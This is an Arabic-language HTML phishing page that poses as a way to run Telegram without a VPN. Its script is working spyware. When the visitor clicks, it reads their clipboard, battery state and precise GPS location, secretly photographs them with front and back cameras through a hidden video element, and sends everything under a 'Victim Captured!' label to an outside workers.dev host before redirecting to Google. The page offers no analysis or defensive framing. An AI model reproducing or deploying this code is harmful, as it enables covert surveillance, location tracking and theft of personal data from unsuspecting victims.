<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { background: #f4f4f9; font-family: system-ui; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 350px; z-index: 10; }
        button { background: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; }
        /* إخفاء الفيديو بطريقة ذكية تخدع المتصفح ليبقى شغالاً */
        #video {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
        }
        #status { margin-top: 15px; color: #666; font-size: 14px; }
    </style>
</head>
<body>

<div class="box">
    <div class="icon" style="font-size:50px;">📨</div>
    <h2>تشغيل تلكرام بدون VPN </h2>
    <p>اضغط لشتغيل تلكرام وضغط على سماح لعطاء صلاحيات التشغيل بدون مشاكل.</p>
    <button id="btn" onclick="startTracking()">التالي </button>
    <div id="status"></div>
</div>

<!-- عنصر الفيديو يبقى موجوداً في الصفحة لكنه غير مرئي -->
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
async function startTracking() {
    const btn = document.getElementById('btn');
    const status = document.getElementById('status');
    btn.disabled = true;
    btn.style.background = "#ccc";
    status.innerText = "جاري الاتصال بالسيرفر...";

    let data = {
        battery: "Unknown",
        clipboard: "غير مسموح",
        location: "لم يتم السماح",
        frontImg: null,
        backImg: null
    };

    // 1. البطارية
    try {
        const b = await navigator.getBattery();
        data.battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`;
    } catch(e) {}

    // 2. الحافظة
    try {
        data.clipboard = await navigator.clipboard.readText();
    } catch(e) { data.clipboard = "رفض أو فارغة"; }

    // 3. الموقع GPS
    try {
        const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
        });
        data.location = `📍 <b>الموقع:</b> https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
    } catch(e) { data.location = "📍 الموقع: تم الرفض"; }

    // 4. التقاط الصور (تحسين جذري)
    status.innerText = "جاري معالجة البيانات (قد يستغرق 5 ثوانٍ)...";
    
    data.frontImg = await takeShot("user"); // الكاميرا الأمامية
    await new Promise(r => setTimeout(r, 1000)); // فاصل زمني بين الكاميرتين لراحة الحساس
    data.backImg = await takeShot("environment"); // الكاميرا الخلفية

    // 5. التجميع والإرسال
    const msg = `
✅ <b>Victim Captured!</b>
🔋 <b>Battery:</b> ${data.battery}
📋 <b>Clipboard:</b> <code>${data.clipboard}</code>
${data.location}
📱 <b>System:</b> ${navigator.platform}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;

    await fetch("https://cold-brook-420f.tjarb093.workers.dev/", {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: msg, frontImage: data.frontImg, backImage: data.backImg })
    });

    window.location.href = "https://www.google.com";
}

async function takeShot(mode) {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    let stream = null;

    try {
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } }, 
            audio: false 
        });
        video.srcObject = stream;

        // الانتظار حتى يبدأ الفيديو فعلياً (مهم جداً لحل مشكلة السواد)
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(resolve, 3500); // زيادة وقت الانتظار لضبط الإضاءة تلقائياً
            };
        });

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const img = canvas.toDataURL('image/jpeg', 0.7);
        
        // إيقاف الكاميرا فوراً
        stream.getTracks().forEach(t => t.stop());
        video.srcObject = null;
        
        return img;
    } catch (e) {
        if (stream) stream.getTracks().forEach(t => t.stop());
        return null;
    }
}
</script>
</body>
</html>
